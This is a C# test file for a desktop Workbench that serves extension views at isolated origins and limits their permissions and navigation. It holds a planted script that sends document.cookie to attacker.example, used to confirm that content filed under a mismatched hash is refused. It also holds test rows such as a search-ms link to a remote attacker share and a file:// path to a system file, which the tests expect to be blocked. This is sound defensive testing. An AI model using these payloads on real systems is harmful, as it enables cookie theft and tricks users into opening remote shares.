using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Data.Sqlite;
using Nendo.Engine;

namespace Nendo.Desktop.Tests;

/// <summary>
/// The host half of custom views running inside the Workbench (ADR-0013): an origin
/// for each package in each file, content served from the open file, and the device's switches.
/// </summary>
[TestClass]
public sealed class DesktopExtensionServingTests
{
    private const string PackageId = "org.example.map";
    private const string Html = "<!doctype html><script src=\"/_nendo/api.js\"></script><script src=\"app.js\"></script>";
    private const string Script = "nendo.view.loadRecords().then(console.log);";

    [TestMethod]
    public void EveryPackageIsASiteOfItsOwnBoundToItsFile()
    {
        var host = ExtensionOrigins.Host("app-one", "instance-one", PackageId);
        StringAssert.Matches(host, new Regex(@"^org-example-map-[0-9a-f]{10}\.example$"));
        Assert.AreEqual(host, ExtensionOrigins.Host("app-one", "instance-one", PackageId), "An origin that moved would lose the view's storage.");
        Assert.AreNotEqual(host, ExtensionOrigins.Host("app-two", "instance-one", PackageId), "Two files carrying one package must not share storage.");
        Assert.AreNotEqual(host, ExtensionOrigins.Host("app-one", "instance-one", "org.example.chart"));
        // A Duplicate keeps its original's application ID and gets a new
        // instance ID; sharing the original's origin gave it the original's drafts and unanswered saves.
        Assert.AreNotEqual(host, ExtensionOrigins.Host("app-one", "instance-two", PackageId),
            "A Duplicate (one application ID, another instance) shares its original's view storage.");

        var awkward = ExtensionOrigins.Host("app-one", "instance-one", "org.a--b-.c" + new string('d', 60));
        var label = awkward[..^ExtensionOrigins.Suffix.Length];
        Assert.IsFalse(label.Contains("--", StringComparison.Ordinal), awkward);
        Assert.IsLessThanOrEqualTo(63, label.Length, awkward);
        Assert.IsTrue(ExtensionOrigins.IsViewHost(awkward));

        Assert.IsFalse(ExtensionOrigins.IsViewHost("example.org"));
        Assert.IsFalse(ExtensionOrigins.IsViewHost("a.b.example"), "Only a single label under the suffix is a view.");
        Assert.IsFalse(ExtensionOrigins.IsViewHost(".example"));
        Assert.IsFalse(ExtensionOrigins.IsViewHost(DesktopShellContract.WorkbenchHostName));
    }

    /// <summary>
    /// The instance ID is part of the origin's key, which would move every view of a file kept
    /// before it to a new origin and lose its drafts. For each application, the
    /// instance this device opened last keeps the origin it had; another instance of it, a
    /// Duplicate made since among them, gets the new one. The choice is written once.
    /// </summary>
    [TestMethod]
    public void TheInstanceOpenedLastKeepsItsViewsOriginAcrossTheUpgradeAndTheChoiceIsKeptOnce()
    {
        var root = Directory.CreateTempSubdirectory("nendo-origin-carry-");
        try
        {
            var carry = new ExtensionOriginCarry(root.FullName, () => new Dictionary<string, string> { ["app-one"] = "instance-a" });
            Assert.IsTrue(carry.Holds("app-one", "instance-a"), "The file opened last before the upgrade does not keep its origin.");
            Assert.IsFalse(carry.Holds("app-one", "instance-b"), "Another instance of the application (a Duplicate) was given the old origin.");
            Assert.IsFalse(carry.Holds("app-two", "instance-a"));
            var old = ExtensionOrigins.Host("app-one", "instance-a", PackageId, carriedOver: true);
            Assert.AreEqual(old, ExtensionOrigins.Host("app-one", "instance-b", PackageId, carriedOver: true), "The carried origin is not the application's old one.");
            Assert.AreNotEqual(old, ExtensionOrigins.Host("app-one", "instance-a", PackageId));

            var path = Path.Combine(DesktopDeviceStateLayout.Views(root.FullName), ExtensionOriginCarry.FileName);
            var written = File.ReadAllBytes(path);
            var later = new ExtensionOriginCarry(root.FullName, () => new Dictionary<string, string> { ["app-one"] = "instance-b" });
            Assert.IsTrue(later.Holds("app-one", "instance-a"), "A second start chose again.");
            Assert.IsFalse(later.Holds("app-one", "instance-b"), "A second start chose again.");
            CollectionAssert.AreEqual(written, File.ReadAllBytes(path), "The choice was written again.");

            var empty = Directory.CreateDirectory(Path.Combine(root.FullName, "empty")).FullName;
            Assert.IsEmpty(new ExtensionOriginCarry(empty, () => new Dictionary<string, string>()).Holders());
            Assert.IsTrue(File.Exists(Path.Combine(DesktopDeviceStateLayout.Views(empty), ExtensionOriginCarry.FileName)), "An empty recent list did not settle the choice.");
            Assert.IsFalse(new ExtensionOriginCarry(empty, () => new Dictionary<string, string> { ["app-one"] = "instance-a" }).Holds("app-one", "instance-a"),
                "A device with no recent files gave a file the old origin later.");

            var unreadable = Directory.CreateDirectory(Path.Combine(root.FullName, "unreadable")).FullName;
            Assert.IsFalse(new ExtensionOriginCarry(unreadable, () => null).Holds("app-one", "instance-a"));
            Assert.IsFalse(File.Exists(Path.Combine(DesktopDeviceStateLayout.Views(unreadable), ExtensionOriginCarry.FileName)), "A list that could not be read just now settled the choice.");
        }
        finally
        {
            root.Delete(recursive: true);
        }
    }

    [TestMethod]
    public async Task AHostWithTheNewKeyServesTheFileOpenedLastAtTheOriginItsViewsHad()
    {
        await using var workspace = new DesktopTestWorkspace();
        await SeedAsync(workspace.FilePath);
        var history = Path.Combine(workspace.FileHistoryRoot, "history");
        string applicationId, instanceId;
        // An earlier start recorded the file in the recent list.
        await using (var earlier = new DesktopSessionController(fileHistoryRoot: history, deviceStateRoot: Path.Combine(workspace.FileHistoryRoot, "before")))
        {
            var opened = await earlier.OpenAsync(workspace.FilePath);
            applicationId = opened.Manifest!.ApplicationId;
            instanceId = opened.Manifest.InstanceId;
        }
        await using var upgraded = new DesktopSessionController(fileHistoryRoot: history, deviceStateRoot: Path.Combine(workspace.FileHistoryRoot, "after"));
        await upgraded.OpenAsync(workspace.FilePath);
        var package = (await upgraded.GetViewAsync()).Extensions!.Packages.Single();
        var carried = ExtensionOrigins.Host(applicationId, instanceId, PackageId, carriedOver: true);
        Assert.AreEqual("https://" + carried, package.Origin, "The file opened last before the upgrade lost its views' origin, and their storage with it.");
        Assert.AreEqual(200, (await upgraded.ReadExtensionAssetAsync(carried, "")).Status);
    }

    [TestMethod]
    public async Task AViewIsServedFromTheOpenFileAndRefusedWhileViewsAreOff()
    {
        await using var workspace = new DesktopTestWorkspace();
        await SeedAsync(workspace.FilePath);
        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
        await session.OpenAsync(workspace.FilePath);

        var view = await session.GetViewAsync();
        var runtime = view.Extensions!;
        Assert.IsTrue(runtime.Run);
        Assert.IsNull(runtime.OffReason);
        var package = runtime.Packages.Single();
        Assert.AreEqual(PackageId, package.PackageId);
        Assert.AreEqual("https://" + ExtensionOrigins.Host(view.Manifest!.ApplicationId, view.Manifest.InstanceId, PackageId), package.Origin);
        var host = new Uri(package.Origin!).Host;

        var entry = await session.ReadExtensionAssetAsync(host, "");
        Assert.AreEqual(200, entry.Status);
        Assert.AreEqual("text/html", entry.MediaType);
        Assert.AreEqual(Html, Encoding.UTF8.GetString(entry.Content));
        var script = await session.ReadExtensionAssetAsync(host, "app.js");
        Assert.AreEqual((200, "text/javascript"), (script.Status, script.MediaType));
        Assert.AreEqual(404, (await session.ReadExtensionAssetAsync(host, "missing.js")).Status);
        Assert.AreEqual(404, (await session.ReadExtensionAssetAsync("org-example-map-0000000000.example", "")).Status,
            "An origin the open file does not have is not served, whatever its name says.");
        Assert.AreEqual(200, session.ExtensionOriginStatus(host));

        view = await session.SetExtensionSettingAsync("file", false);
        Assert.AreEqual((false, "file", true, false), (view.Extensions!.Run, view.Extensions.OffReason, view.Extensions.DeviceEnabled, view.Extensions.FileEnabled));
        Assert.AreEqual(403, (await session.ReadExtensionAssetAsync(host, "")).Status);
        Assert.AreEqual(403, session.ExtensionOriginStatus(host), "The API script is refused with the rest.");

        await session.SetExtensionSettingAsync("file", true);
        view = await session.SetExtensionSettingAsync("device", false);
        Assert.AreEqual("device", view.Extensions!.OffReason);
        Assert.AreEqual(403, (await session.ReadExtensionAssetAsync(host, "app.js")).Status);
        Assert.IsFalse(new DesktopExtensionSettingsStore(workspace.FileHistoryRoot).Run, "The device switch is kept for the next launch.");

        await session.SetExtensionSettingAsync("device", true);
        session.SuspendExtensions();
        Assert.AreEqual(403, (await session.ReadExtensionAssetAsync(host, "")).Status, "A restart without views takes effect before the next read.");
        Assert.AreEqual("recovery", (await session.GetViewAsync()).Extensions!.OffReason);
        view = await session.SetExtensionSettingAsync("device", true);
        Assert.IsTrue(view.Extensions!.Run, "Turning views on ends a restart without them.");
        Assert.AreEqual(200, (await session.ReadExtensionAssetAsync(host, "")).Status);
    }

    [TestMethod]
    public async Task AnotherFileDeviceOffStopsAnAlreadyOpenControllersOriginsAndWriters()
    {
        await using var firstWorkspace = new DesktopTestWorkspace();
        await using var secondWorkspace = new DesktopTestWorkspace();
        await SeedAsync(firstWorkspace.FilePath);
        await SeedAsync(secondWorkspace.FilePath);
        await using var first = new DesktopSessionController(fileHistoryRoot: firstWorkspace.FileHistoryRoot, deviceStateRoot: firstWorkspace.FileHistoryRoot);
        await using var second = new DesktopSessionController(fileHistoryRoot: secondWorkspace.FileHistoryRoot, deviceStateRoot: firstWorkspace.FileHistoryRoot);
        await first.OpenAsync(firstWorkspace.FilePath);
        await second.OpenAsync(secondWorkspace.FilePath);
        var host = new Uri((await second.GetViewAsync()).Extensions!.Packages.Single().Origin!).Host;
        var changed = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        second.ExtensionSettingsChanged += () => changed.TrySetResult();

        await first.SetExtensionSettingAsync("device", false);

        // The host's authority check reads fresh state even before the polling event/redraw.
        Assert.AreEqual(403, second.ExtensionOriginStatus(host), "Another file's device Off left an origin running.");
        Assert.AreEqual(403, (await second.ReadExtensionAssetAsync(host, "")).Status);
        var refused = Assert.Throws<NendoPreconditionException>(() => second.RequireExtensionWriter(PackageId));
        Assert.AreEqual("views-off", refused.Code);
        await changed.Task.WaitAsync(TimeSpan.FromSeconds(5));
        Assert.AreEqual("device", (await second.GetViewAsync()).Extensions!.OffReason);
        await second.SetExtensionSettingAsync("file", false);
        Assert.IsFalse(new DesktopExtensionSettingsStore(firstWorkspace.FileHistoryRoot).Run,
            "The already-open controller's file toggle restored device On.");
    }

    [TestMethod]
    public async Task ClosingTheFileStopsItsOrigins()
    {
        await using var workspace = new DesktopTestWorkspace();
        await SeedAsync(workspace.FilePath);
        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
        await session.OpenAsync(workspace.FilePath);
        var host = new Uri((await session.GetViewAsync()).Extensions!.Packages.Single().Origin!).Host;
        Assert.AreEqual(200, (await session.ReadExtensionAssetAsync(host, "")).Status);

        await session.CloseAsync();

        Assert.AreEqual(403, (await session.ReadExtensionAssetAsync(host, "")).Status);
        Assert.IsNull((await session.GetViewAsync()).Extensions);
    }

    [TestMethod]
    public async Task ImportIsAProposalAndSoIsRemoval()
    {
        await using var workspace = new DesktopTestWorkspace();
        await using (var coordinator = await NendoWriteCoordinator.CreateAsync(workspace.FilePath, "serving-test")) { }
        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
        await session.OpenAsync(workspace.FilePath);
        var archive = new NendoExtensionArchive(PackageId, "Map", "1.0.0", "index.html", null,
            [new("app.js", Encoding.UTF8.GetBytes(Script)), new("index.html", Encoding.UTF8.GetBytes(Html))]);

        var import = await session.PrepareExtensionImportAsync(archive);
        Assert.AreEqual(NendoProposalState.Previewable, import.State, string.Join("; ", import.Diagnostics.Select(d => d.Message)));
        var view = await session.GetViewAsync();
        Assert.IsFalse(view.Extensions!.Packages.Any(), "A prepared import changes nothing until it is accepted.");
        var host = ExtensionOrigins.Host(view.Manifest!.ApplicationId, view.Manifest.InstanceId, PackageId);
        Assert.AreEqual(404, (await session.ReadExtensionAssetAsync(host, "")).Status, "Code waiting for acceptance must not be served.");
        Assert.IsTrue((await session.PromoteProposalAsync(import.ProposalId, expectedOperationDigest: import.OperationDigest)).Promotion.Applied);
        Assert.AreEqual(PackageId, (await session.GetViewAsync()).Extensions!.Packages.Single().PackageId);
        Assert.AreEqual(Html, Encoding.UTF8.GetString((await session.ReadExtensionAssetAsync(host, "")).Content), "Accepted code runs.");

        var removal = await session.PrepareExtensionRemovalAsync(PackageId);
        Assert.AreEqual(NendoProposalState.Previewable, removal.State, string.Join("; ", removal.Diagnostics.Select(d => d.Message)));
        Assert.IsTrue((await session.PromoteProposalAsync(removal.ProposalId, expectedOperationDigest: removal.OperationDigest)).Promotion.Applied);
        Assert.IsFalse((await session.GetViewAsync()).Extensions!.Packages.Any());
    }

    [TestMethod]
    public async Task TheJourneyFileCompilesWithAViewOfEachKindAndThreePackages()
    {
        await using var workspace = new DesktopTestWorkspace();
        await DesktopExtensionViewJourneyTests.SeedAsync(workspace.FilePath);
        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
        await session.OpenAsync(workspace.FilePath);

        var view = await session.GetViewAsync();
        CollectionAssert.AreEquivalent(DesktopExtensionViewJourneyTests.ProbePackages, view.Extensions!.Packages.Select(p => p.PackageId).ToArray());
        Assert.AreEqual(3, view.Extensions.Packages.Select(p => p.Origin).Distinct().Count(), "Each package is its own origin.");
        var compiled = await session.CompileSemanticUiAsync();
        Assert.IsFalse(compiled.Diagnostics.Any(d => d.Severity == NendoDiagnosticSeverity.Error),
            string.Join("; ", compiled.Diagnostics.Select(d => d.Code + " " + d.Message)));
    }

    [TestMethod]
    [DataRow("bytes=0-9", 0, 9)]
    [DataRow("bytes=90-", 90, 99)]
    [DataRow("bytes=-10", 90, 99)]
    [DataRow("bytes=0-1000", 0, 99)]
    public void AMediaElementGetsTheRangeItAskedFor(string header, int start, int end)
    {
        Assert.IsTrue(ExtensionAssetServer.TryRange(header, 100, out var from, out var to));
        Assert.AreEqual((start, end), (from, to));
    }

    [TestMethod]
    [DataRow("bytes=100-")]
    [DataRow("bytes=5-2")]
    [DataRow("bytes=0-5,10-20")]
    [DataRow("items=0-5")]
    [DataRow("bytes=-0")]
    public void ARangeTheContentCannotAnswerIsRefused(string header) =>
        Assert.IsFalse(ExtensionAssetServer.TryRange(header, 100, out _, out _));

    [TestMethod]
    public async Task ASkillPackageIsListedButHasNoOriginAndNothingServesOrWritesAsIt()
    {
        const string skillId = "org.example.tasks";
        await using var workspace = new DesktopTestWorkspace();
        await using (var coordinator = await NendoWriteCoordinator.CreateAsync(workspace.FilePath, "serving-test"))
        {
            await coordinator.ApplyAsync(new NendoMutation("test", "package", "test", "Map", [
                new SetExtensionPackageOperation("serving-package", PackageId, "Map", "index.html", "1.0.0"),
                PutExtensionFileOperation.FromContent("serving-index", PackageId, "index.html", null, Encoding.UTF8.GetBytes(Html)),
            ]));
            await coordinator.ApplyAsync(new NendoMutation("test", "skill", "test", "Tasks", [
                new SetExtensionPackageOperation("serving-skill", skillId, "Tasks", null, kind: NendoExtensionPackageKind.Skill),
                PutExtensionFileOperation.FromContent("serving-skill-md", skillId, "SKILL.md", null,
                    Encoding.UTF8.GetBytes("---\nname: tasks\ndescription: Tasks.\n---\n")),
            ]));
        }
        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
        await session.OpenAsync(workspace.FilePath);

        var view = await session.GetViewAsync();
        var skill = view.Extensions!.Packages.Single(package => package.PackageId == skillId);
        Assert.AreEqual((NendoExtensionPackageKind.Skill, (string?)null, (string?)null), (skill.Kind, skill.Origin, skill.EntryPoint),
            "A skill package was given somewhere to run.");
        Assert.AreEqual(NendoExtensionPackageKind.View, view.Extensions.Packages.Single(package => package.PackageId == PackageId).Kind);
        var host = ExtensionOrigins.Host(view.Manifest!.ApplicationId, view.Manifest.InstanceId, skillId);
        Assert.AreEqual(404, session.ExtensionOriginStatus(host));
        Assert.AreEqual(404, (await session.ReadExtensionAssetAsync(host, "SKILL.md")).Status);
        var refusal = Assert.ThrowsExactly<NendoPreconditionException>(() => session.RequireExtensionWriter(skillId));
        Assert.AreEqual("actor-not-allowed", refusal.Code);
    }

    /// <summary>
    /// A file's stored hash is only shape-checked when it opens, and view content was
    /// cached by that stated hash for as long as the window lived. A crafted file could file its
    /// own script under the hash of a well-known view's script, and the next file opened in the
    /// window then ran the planted bytes at its own origin, with its own records.
    /// </summary>
    [TestMethod]
    public async Task ContentFiledUnderAnotherHashIsNeitherServedNorCachedForTheNextFile()
    {
        const string Planted = "fetch('https://attacker.example/?d=' + document.cookie);";
        await using var crafted = new DesktopTestWorkspace();
        await SeedAsync(crafted.FilePath);
        await using (var outside = new SqliteConnection(new SqliteConnectionStringBuilder
        {
            DataSource = crafted.FilePath, Mode = SqliteOpenMode.ReadWrite, Pooling = false,
        }.ToString()))
        {
            await outside.OpenAsync();
            await using var command = outside.CreateCommand();
            command.CommandText = "UPDATE __nendo_extension_blob SET content = @content, byte_length = @length WHERE sha256 = @sha;";
            command.Parameters.AddWithValue("@content", Encoding.UTF8.GetBytes(Planted));
            command.Parameters.AddWithValue("@length", Encoding.UTF8.GetByteCount(Planted));
            command.Parameters.AddWithValue("@sha", NendoExtensionContent.Sha256(Encoding.UTF8.GetBytes(Script)));
            Assert.AreEqual(1, await command.ExecuteNonQueryAsync());
        }
        await using var genuine = new DesktopTestWorkspace();
        await SeedAsync(genuine.FilePath);
        await using var session = new DesktopSessionController(fileHistoryRoot: crafted.FileHistoryRoot, deviceStateRoot: crafted.FileHistoryRoot);

        await session.OpenAsync(crafted.FilePath);
        var craftedRuntime = (await session.GetViewAsync()).Extensions!;
        Assert.IsTrue(craftedRuntime.Run, "Views run for the crafted file, so only the hash check can refuse it.");
        var craftedHost = new Uri(craftedRuntime.Packages.Single().Origin!).Host;
        var planted = await session.ReadExtensionAssetAsync(craftedHost, "app.js");
        Assert.AreEqual(500, planted.Status, "Bytes that do not match their hash are not served: " + Encoding.UTF8.GetString(planted.Content));

        await session.CloseAsync();
        await session.OpenAsync(genuine.FilePath);
        var genuineHost = new Uri((await session.GetViewAsync()).Extensions!.Packages.Single().Origin!).Host;
        var script = await session.ReadExtensionAssetAsync(genuineHost, "app.js");
        Assert.AreEqual(200, script.Status);
        Assert.AreEqual(Script, Encoding.UTF8.GetString(script.Content), "The next file's view gets its own script, not the planted one.");
    }

    /// <summary>
    /// View content is cached for one file session only. Content
    /// cached while a file was open is not answered once it closes, so a reopened file is read
    /// afresh, and a cache can never carry one file's bytes into another file's view.
    /// </summary>
    [TestMethod]
    public async Task CachedViewContentEndsWithTheFileSession()
    {
        await using var workspace = new DesktopTestWorkspace();
        await SeedAsync(workspace.FilePath);
        await using var session = new DesktopSessionController(fileHistoryRoot: workspace.FileHistoryRoot, deviceStateRoot: workspace.FileHistoryRoot);
        await session.OpenAsync(workspace.FilePath);
        var host = new Uri((await session.GetViewAsync()).Extensions!.Packages.Single().Origin!).Host;
        Assert.AreEqual(200, (await session.ReadExtensionAssetAsync(host, "app.js")).Status, "Read once, so it is cached.");
        await session.CloseAsync();

        // Damaged while closed: a read from the file now answers 500, a cache hit would answer 200.
        await using (var outside = new SqliteConnection(new SqliteConnectionStringBuilder
        {
            DataSource = workspace.FilePath, Mode = SqliteOpenMode.ReadWrite, Pooling = false,
        }.ToString()))
        {
            await outside.OpenAsync();
            await using var command = outside.CreateCommand();
            command.CommandText = "UPDATE __nendo_extension_blob SET content = X'2F2F', byte_length = 2 WHERE sha256 = @sha;";
            command.Parameters.AddWithValue("@sha", NendoExtensionContent.Sha256(Encoding.UTF8.GetBytes(Script)));
            Assert.AreEqual(1, await command.ExecuteNonQueryAsync());
        }
        await session.OpenAsync(workspace.FilePath);
        Assert.AreEqual(500, (await session.ReadExtensionAssetAsync(host, "app.js")).Status,
            "The reopened file was read afresh, not answered from the last session's cache.");
    }

    /// <summary>
    /// A view's request for anything but a clipboard read or several downloads went to
    /// WebView2's own prompt. The request carries the Workbench's origin, so an Allow kept there
    /// covered every view of every file: the person's own map view's location grant reached a
    /// view in a file someone sent them. Every other kind is now refused, and nothing is kept.
    /// </summary>
    [TestMethod]
    public void AViewIsGivenTheClipboardAutoplayAndDownloadsAndRefusedEverythingElse()
    {
        foreach (var kind in Enum.GetValues<Microsoft.Web.WebView2.Core.CoreWebView2PermissionKind>())
        {
            var expected = kind is Microsoft.Web.WebView2.Core.CoreWebView2PermissionKind.ClipboardRead
                or Microsoft.Web.WebView2.Core.CoreWebView2PermissionKind.MultipleAutomaticDownloads
                or Microsoft.Web.WebView2.Core.CoreWebView2PermissionKind.Autoplay
                ? Microsoft.Web.WebView2.Core.CoreWebView2PermissionState.Allow
                : Microsoft.Web.WebView2.Core.CoreWebView2PermissionState.Deny;
            var answer = ExtensionWebViewPolicy.ViewPermission(kind);
            Assert.IsTrue(answer.Handled, $"{kind} reaches the Workbench's handler.");
            Assert.IsFalse(answer.SavesInProfile, $"{kind}'s answer is kept in the profile, where it covers every view.");
            Assert.AreEqual(expected, answer.State, $"{kind} is answered by the host, never left to the browser's prompt.");
        }
    }

    /// <summary>
    /// Only a view's pop-ups were held to http, https and mailto; a frame sent to any
    /// other scheme reached WebView2's prompt to open the app registered for it, so a view in a
    /// received file could offer Explorer opening a remote share dressed as a search.
    /// </summary>
    [TestMethod]
    [DataRow("search-ms:query=invoice&crumb=location:\\\\attacker\\share", true)]
    [DataRow("ms-settings:privacy", true)]
    [DataRow("file:///C:/Windows/win.ini", true)]
    [DataRow("mailto:someone@example.com", true)]
    [DataRow("https://app.nendo.local/index.html", true)]
    [DataRow("https://example.com/page", false)]
    [DataRow("http://example.com/page", false)]
    [DataRow("about:blank", false)]
    [DataRow("javascript:void(0)", false)]
    [DataRow("data:text/html,hi", false)]
    [DataRow("blob:https://example.com/1f2e", false)]
    public void AFrameLoadsOnlyWebSchemesAndNeverStartsAnotherApp(string address, bool cancelled)
    {
        var decision = ExtensionWebViewPolicy.FrameNavigation(address, userInitiated: false);
        Assert.AreEqual(cancelled, decision.Cancel, address);
        Assert.IsNull(decision.Mail, $"{address} started an app with no click.");
    }

    [TestMethod]
    public void AMailLinkThePersonFollowedOpensTheirMailAppAndNothingElseDoes()
    {
        var followed = ExtensionWebViewPolicy.FrameNavigation("mailto:someone@example.com", userInitiated: true);
        Assert.IsTrue(followed.Cancel);
        Assert.AreEqual("mailto:someone@example.com", followed.Mail?.OriginalString);
        Assert.IsNull(ExtensionWebViewPolicy.FrameNavigation("search-ms:query=x", userInitiated: true).Mail,
            "A followed link to another scheme was launched.");
    }

    private static async Task SeedAsync(string path)
    {
        await using var coordinator = await NendoWriteCoordinator.CreateAsync(path, "serving-test");
        await coordinator.ApplyAsync(new NendoMutation("test", "package", "test", "Map", [
            new SetExtensionPackageOperation("serving-package", PackageId, "Map", "index.html", "1.0.0"),
            PutExtensionFileOperation.FromContent("serving-index", PackageId, "index.html", null, Encoding.UTF8.GetBytes(Html)),
            PutExtensionFileOperation.FromContent("serving-app", PackageId, "app.js", null, Encoding.UTF8.GetBytes(Script)),
        ]));
    }
}
